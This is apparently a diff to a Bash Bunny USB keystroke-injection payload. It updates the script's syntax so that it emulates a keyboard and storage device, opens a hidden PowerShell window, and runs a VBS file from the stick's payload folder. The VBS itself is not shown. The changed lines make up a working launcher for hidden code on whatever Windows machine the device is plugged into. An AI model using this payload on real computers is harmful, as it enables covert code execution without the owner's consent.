@@ -15,9 +15,6 @@
 #Define your bunny storage stick name
 DRIVER_LABEL='BashBunny'
 
-#To get the $SWITCH_POSITION var
-source bunny_helpers.sh
-
 #RED means starting
 LED R
 
@@ -25,13 +22,10 @@ LED R
 ATTACKMODE HID STORAGE
 
 #Set keyboard language
-QUACK SET_LANGUAGE en
+DUCKY_LANG us
 
 QUACK DELAY 500
-QUACK GUI r
-QUACK DELAY 100
-QUACK STRING powershell -windowstyle hidden ".((gwmi win32_volume -f 'label=''$DRIVER_LABEL''').Name+'payloads\\$SWITCH_POSITION\a.vbs')"
-QUACK ENTER
+RUN WIN powershell -windowstyle hidden ".((gwmi win32_volume -f 'label=''$DRIVER_LABEL''').Name+'payloads\\$SWITCH_POSITION\a.vbs')"
 QUACK DELAY 1000
 
 # GREEN means finished
